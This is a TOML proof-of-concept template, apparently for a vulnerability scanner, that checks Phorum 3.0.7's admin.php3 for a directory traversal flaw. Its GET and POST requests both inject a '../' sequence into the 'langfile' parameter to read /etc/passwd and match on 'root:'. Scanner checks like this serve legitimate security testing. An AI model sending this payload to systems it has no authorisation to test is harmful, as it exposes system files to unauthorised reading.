[info]
author = "ave"
description = "检测 Phorum 3.0.7 Master Settings 页面 langfile 参数目录遍历漏洞，通过注入 ../ 序列尝试读取 /etc/passwd 确认是否存在路径遍历"
id = "POC-AVE-2000-1158"
name = "Phorum 3.0.7 目录遍历任意文件读取 PoC"
severity = "medium"
tags = ["ave-2000-1158"]
vuln_id = [
    "CVE-2000-1229",
    "AVE-2000-1158",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin.php3?langfile=../../../../../../../../etc/passwd"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/admin.php3"
protocol = "http"

[poc.requests.body]
content = "langfile=../../../../../../../../etc/passwd"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
